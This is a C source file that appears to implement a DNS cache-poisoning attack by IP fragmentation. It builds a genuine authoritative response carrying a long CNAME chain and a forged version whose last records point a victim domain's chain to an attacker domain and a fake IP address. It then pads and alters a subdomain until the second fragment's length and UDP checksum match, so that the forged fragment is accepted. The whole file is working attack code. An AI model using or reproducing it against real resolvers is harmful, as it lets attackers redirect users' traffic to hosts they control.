#include "fake.h"

/*
    Help Build the origin CNAME Chain
*/
void _build_chain(
    struct dns_query** query,
    struct dns_answer** answers,
    char* qname,
    char* prefix,
    char* domain,
    char* ip,
    size_t length
) {
    query[0] = new_dns_query_a(qname);

    // domain 
    char cur_domain[DOMAIN_MAX_LEN];
    char next_domain[DOMAIN_MAX_LEN];

    // a. qname -> prefix0.victim
    snprintf(cur_domain, DOMAIN_MAX_LEN, "%s0.%s", prefix, domain);
    answers[0] = new_dns_answer_cname(qname, cur_domain, 3600);

    // b. CNAME链
    for (size_t i = 0; i < length; i++) {
        snprintf(cur_domain, DOMAIN_MAX_LEN, "%s%zu.%s", prefix, i, domain);
        snprintf(next_domain, DOMAIN_MAX_LEN, "%s%zu.%s", prefix, i + 1, domain);
        // answers数组的索引是 i+1
        answers[i + 1] = new_dns_answer_cname(cur_domain, next_domain, 3600);
    }

    // c. A record
    snprintf(cur_domain, DOMAIN_MAX_LEN, "%s%zu.%s", prefix, length, domain);
    answers[length + 1] = new_dns_answer_a(cur_domain, inet_addr(ip), 3600);

}


/*
    Build an authoritative-like response with a CNAME chain.
*/
size_t _build_std_resp(
    uint8_t* packet,
    size_t packet_len,
    char* qname,
    char* prefix,
    char* victim,
    char* origin_ip,
    size_t length
) {
    // Init
    struct dns_query* query[1];
    const size_t answer_count = length + 2;
    struct dns_answer* answers[answer_count];

    size_t dns_payload_len = 0;
    query[0] = NULL;
    for (size_t i = 0; i < answer_count; i++) answers[i] = NULL;
    
    // Build CNAME Chain
    _build_chain(
        query,
        answers,
        qname,
        prefix,
        victim,
        origin_ip,
        length
    );


    dns_payload_len = make_dns_packet(packet, packet_len, TRUE, 0, query, 1, answers, answer_count, NULL, 0, FALSE);
    
    if (dns_payload_len > 0) {
        set_dns_flags(packet, dns_payload_len,
            1,                  // qr = 1 (response)
            DNS_OPCODE_QUERY,
            1,                  // aa = 1 (authoritative)
            0,                  // tc = 0
            -1,                 // rd = -1 
            1,                  // ra = 1 (recursion available) 
            DNS_RCODE_NOERROR
        );
    }


    if (dns_payload_len == (size_t)-1 || dns_payload_len == 0) {
        fprintf(stderr, "_build_std_resp: Failed to make large DNS packet.\n");
    }
#ifdef _DEBUG
    printf("_build_std_resp: payload created with size: %zu bytes.\n", dns_payload_len);
#endif

    if (query[0]) {
        free_dns_query(query[0]);
    }
    for (size_t i = 0; i < answer_count; i++) {
        if (answers[i]) {
            free_dns_answer(answers[i]);
        }
    }
    return dns_payload_len;
}

/*
    Build Original Packet Used to Fake Std Response
*/
size_t _build_origin_fake_resp(
    uint8_t* packet,
    size_t packet_len,
    char* qname,
    char* prefix,
    char* victim,
    char* attacker,
    char* fake_ip,
    char* subdomain,
    size_t length
) {

    // Init
    struct dns_query* query[1];
    const size_t answer_count = length + 2;
    struct dns_answer* answers[answer_count];

    size_t dns_payload_len = 0;
    query[0] = NULL;
    for (size_t i = 0; i < answer_count; i++) answers[i] = NULL;

    // Build Origin Std CNAME Chain
    _build_chain(
        query,
        answers,
        qname,
        prefix,
        victim,
        fake_ip,
        length
    );
    
    // Change the Payload
    uint8_t domain[DOMAIN_MAX_LEN];
    uint8_t last_domain[DOMAIN_MAX_LEN];
    struct dns_answer* answer;
    // change the last A record
    snprintf(domain, DOMAIN_MAX_LEN, "%s", attacker);
    answer = new_dns_answer_a(domain, inet_addr(fake_ip), 3600);
    free(answers[length + 1]);
    answers[length + 1] = answer;
    // change the last but not least CNAME
    snprintf(last_domain, DOMAIN_MAX_LEN, "%s.%s", subdomain, victim);
    answer = new_dns_answer_cname(last_domain, domain, 3600);
    free(answers[length]);
    answers[length] = answer;
    // change the last last CNAME
    snprintf(domain, DOMAIN_MAX_LEN, "%s", last_domain);
    snprintf(last_domain, DOMAIN_MAX_LEN, "%s%d.%s", prefix, length - 2, victim);
    answer = new_dns_answer_cname(last_domain, domain, 3600);
    free(answers[length - 1]);
    answers[length - 1] = answer;


    dns_payload_len = make_dns_packet(packet, packet_len, TRUE, 0, query, 1, answers, answer_count, NULL, 0, FALSE);
    
    if (dns_payload_len > 0) {
        set_dns_flags(packet, dns_payload_len,
            1,                  // qr = 1 (response)
            DNS_OPCODE_QUERY,
            1,                  // aa = 1 (authoritative)
            0,                  // tc = 0
            -1,                 // rd = -1 
            1,                  // ra = 1 (recursion available) 
            DNS_RCODE_NOERROR
        );
    }


    if (dns_payload_len == (size_t)-1 || dns_payload_len == 0) {
        fprintf(stderr, "_build_origin_fake_resp: Failed to make large DNS packet.\n");
    }
#ifdef _DEBUG
    printf("_build_origin_fake_resp: payload created with size: %zu bytes.\n", dns_payload_len);
#endif

    if (query[0]) {
        free_dns_query(query[0]);
    }
    for (size_t i = 0; i < answer_count; i++) {
        if (answers[i]) {
            free_dns_answer(answers[i]);
        }
    }
    return dns_payload_len;
}

/*
    get the payload "checksum" and length
*/

int check_payload(
    struct chkres* chkres,
    const uint8_t* data,
    size_t len
) {
    // Init
    chkres->sum = 0;
    chkres->len = 0;
    
    // Caculate checksum
    size_t payload = MTU - sizeof(struct iphdr) - sizeof(struct udphdr);
    if (len <= payload) {
        return -1; // 没有第二个分片的数据
    }

    const uint8_t* second_packet = data + payload;
    size_t second_len = len - payload;
    chkres->len = second_len;

    for (size_t i = 0; i < second_len; i += 2) {
        uint16_t word = second_packet[i] << 8;
        if (i + 1 < second_len) {
            word |= second_packet[i + 1];
        }
        chkres->sum += word;
    }
    return 0;
}

/*
    Compare two Payloads
*/

bool cmp_payloads(const uint8_t* payload1, size_t len1, const uint8_t* payload2, size_t len2) {
    struct chkres res1, res2;

    if (check_payload(&res1, payload1, len1) || check_payload(&res2, payload2, len2)) {
#ifdef _DEBUG
        printf("cmp_payloads: error when check payload");
#endif
        return false;
    }

    if (res1.len != res2.len) {
#ifdef _DEBUG
        printf("check_payload: length not equal!!!\n");
        printf("byte1: %zu bytes, byte2: %zu bytes\n", res1.len, res2.len);
#endif
        return false;
    }
    if (res1.sum != res2.sum) {
#ifdef _DEBUG
        printf("check_payload: sum not equal!!!\n");
        printf("[INFO] byte1: %llu, byte2: %llu\n", (unsigned long long)res1.sum, (unsigned long long)res2.sum);
#endif
        return false;
    }
#ifdef _DEBUG
    printf("check_payload: Payload check pass!!!\n");
#endif
    return true;
}

/*
    Search for str in the Origin DNS hex
*/

int find(
    struct findres* findres,
    const uint8_t* data, 
    size_t data_len, 
    const char* search_str
) {
    // Init
    findres->positions = NULL;
    findres->count = 0;
    
    // If search for nothing return
    size_t search_len = strlen(search_str);
    if (search_len == 0) 
        return -1;

    // Init findres
    size_t capacity = 4;
    findres->positions = alloc_memory(sizeof(int) * capacity);
    if (!findres->positions)
        return -1;

    // Begin to search
    const uint8_t* current_pos = data;
    while (current_pos < data + data_len) {
        const uint8_t* found = _memmem(current_pos, (data + data_len) - current_pos, search_str, search_len);
        if (!found) break;
        
        // Need to realloc more space
        if (findres->count >= capacity) {
            capacity *= 2;
            int* new_pos = realloc(findres->positions, sizeof(int) * capacity);
            if (!new_pos) {
                free(findres->positions);
                findres->positions = NULL;
                findres->count = 0;
                return -1;
            }
            findres->positions = new_pos;
        }

        size_t index = found - data;
        size_t second_frag_index = index;
        findres->positions[findres->count++] = (second_frag_index % 2 == 0) ? 1 : 2;
        current_pos = found + 1;
    }
    return 0;
}

/*
    Free the uesd find result
*/

void free_findres(struct findres* result) {
    if (result && result->positions) {
        free(result->positions);
        result->positions = NULL;
        result->count = 0;
    }
}

/*
    Fake the Payload
*/

char* fake(
    uint64_t target_sum, 
    uint64_t current_sum, 
    const char* data_str, 
    const struct findres* pos
) {
    int64_t total_delta = target_sum - current_sum;
    if (total_delta == 0) 
        return _strdup(data_str);

    size_t n_bytes = strlen(data_str);
    char* modified_str = _strdup(data_str);
    if (!modified_str) 
        return NULL;

    for (size_t i = 0; i < n_bytes; ++i) {
        if (!isalnum((unsigned char)modified_str[i])) {
            fprintf(stderr, "Original string '%s' contains non-alnum chars.\n", data_str);
            free(modified_str);
            return NULL;
        }
    }
    
    int64_t* factors = calloc(n_bytes, sizeof(int64_t));
    if(!factors) {
        free(modified_str);
        return NULL;
    }

    for (size_t i = 0; i < n_bytes; ++i) {
        for (size_t j = 0; j < pos->count; ++j) {
            if ((pos->positions[j] + i - 1) % 2 == 0) { // High byte
                factors[i] += 256;
            } else { // Low byte
                factors[i] += 1;
            }
        }
    }

    int64_t remaining_delta = total_delta;
    for (size_t i = 0; i < n_bytes; ++i) {
        if (remaining_delta == 0) 
            break;
        if (factors[i] == 0)
            continue;

        int64_t ideal_change = remaining_delta / factors[i];
        int actual_change = 0;
        if (ideal_change > 0 && ideal_change > ((int64_t)('z' - modified_str[i]))) {
            ideal_change = 'z' - modified_str[i];
        }
        if (ideal_change < 0 && ideal_change < ((int64_t)('0' - modified_str[i]))) {
            ideal_change = '0' - modified_str[i];
        }

        // Search for a valid change that keeps the char alphanumeric
        for (int c = ideal_change; c != 0; c += (ideal_change > 0 ? -1 : 1)) {
            if (isalnum(modified_str[i] + c)) {
                actual_change = c;
                break;
            }
        }
        
        if (actual_change != 0) {
            modified_str[i] += actual_change;
            remaining_delta -= (int64_t)actual_change * factors[i];
        }
    }
    
    free(factors);

    if (remaining_delta != 0) {
        fprintf(stderr, "Cannot forge checksum. Delta of %lld remains.\n", (long long)remaining_delta);
        free(modified_str);
        return NULL;
    }
    return modified_str;
}

size_t build_fake_resp(
    uint8_t* packet,
    size_t packet_len,
    char* qname, 
    char* prefix, 
    char* victim, 
    char* origin_ip,
    char* attacker, 
    char* fake_ip, 
    size_t length
) {
    uint8_t* std_pkt = alloc_memory(LARGE_PKT_MAX_LEN);
    uint8_t* origin_pkt = alloc_memory(LARGE_PKT_MAX_LEN);
    char* sub = _strdup("x"); // Initial subdomain

    // 1. Build initial packets
    size_t std_len = _build_std_resp(std_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, origin_ip, length);
    size_t origin_len = _build_origin_fake_resp(origin_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, attacker, fake_ip, sub, length);
    
    struct chkres std_check, origin_check;
    if (check_payload(&std_check, std_pkt, std_len) ||
        check_payload(&origin_check, origin_pkt, origin_len)
    ) {
#ifdef _DEBUG
        printf("build_fake_resp: fail to check payload\n");
#endif
        goto fail;
    }
    
    // 2. Length adjustment loop
    int iter = 0;
    while (std_check.len != origin_check.len && iter < 2) {

#ifdef _DEBUG
        printf("build_fake_resp: Payload length not equal!!!\n");
        printf("build_fake_resp: std_len: %zu, origin_len: %zu\n", std_check.len, origin_check.len);
#endif
        if (std_check.len < origin_check.len) {
            fprintf(stderr, "Origin packet is longer than standard, cannot fix.\n");
            goto fail;
        }

        // padding
        size_t diff = std_check.len - origin_check.len;
        if (diff % 2 != 0) {
            fprintf(stderr, "Odd length difference, should not happen.\n");
            goto fail;
        }

        free(sub);
        size_t sub_len = 1 + diff / 2;
        // new padding
        sub = malloc(sub_len + 1);
        memset(sub, 'x', sub_len);
        sub[sub_len] = '\0';
#ifdef _DEBUG
        printf("build_fake_resp: New subdomain for padding: %s\n", sub);
#endif
        origin_len = _build_origin_fake_resp(origin_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, attacker, fake_ip, sub, length);

        if (check_payload(&origin_check, origin_pkt, origin_len)) {
#ifdef _DEBUG
            printf("build_fake_resp: new packet's payload too small\n");
#endif
            goto fail;
        }
        iter++;
    }

    if (std_check.len != origin_check.len) {
        fprintf(stderr, "Failed to make lengths equal.\n");
        goto fail;
    }
#ifdef _DEBUG
    printf("build_fake_resp: Payload length equal: %zu\n", std_check.len);
#endif
    // 3. Checksum adjustment loop
    iter = 0;
    while (std_check.sum != origin_check.sum && iter < 2) {
#ifdef _DEBUG        
        printf("build_fake_resp: Payload checksum not equal!!!\n");
        printf("build_fake_resp: std_sum: %llu, origin_sum: %llu\n", (unsigned long long)std_check.sum, (unsigned long long)origin_check.sum);
#endif
        struct findres pos;
        find(&pos, origin_pkt, origin_len, sub);
#ifdef _DEBUG
        printf("build_fake_resp: Found %zu occurrences of '%s' to modify.\n", pos.count, sub);
        printf("build_fake_resp: the occurrences is (");
        for (size_t i = 0; i < pos.count; i++) {
            printf("%d, ", pos.positions[i]);
        }
        printf(")\n");
#endif
        char* new_sub = fake(std_check.sum, origin_check.sum, sub, &pos);
        free_findres(&pos);

        if (!new_sub) {
            fprintf(stderr, "fake_checksum failed.\n");
            goto fail;
        }
#ifdef _DEBUG
        printf("build_fake_resp: New forged subdomain: %s\n", new_sub);
#endif
        free(sub);
        sub = new_sub;

        origin_len = _build_origin_fake_resp(origin_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, attacker, fake_ip, sub, length);
        if (check_payload(&origin_check, origin_pkt, origin_len)) {
#ifdef _DEBUG
            printf("build_fake_resp: can't check payload after fake\n");
#endif
        }
        iter++;
    }

    // 4. Final check
    if (cmp_payloads(std_pkt, std_len, origin_pkt, origin_len)) {
#ifdef _DEBUG
        printf("build_fake_resp: Final payload check passed! Forged packet is ready.\n");
#endif
        free(std_pkt);
        free(sub);

        if (packet_len < origin_len) {
            fprintf(stderr, "Packet Too Small\n");
#ifdef _DEBUG
            printf("build_fake_resp: the packet given is too small can't contain the new one.\n");
#endif
            goto fail;
        }

        memcpy(packet, origin_pkt, MIN(packet_len, origin_len));
        return origin_len;
    }

fail:
    fprintf(stderr, "Failed to build fake response.\n");
    free(std_pkt);
    free(origin_pkt);
    free(sub);
    return 0;
}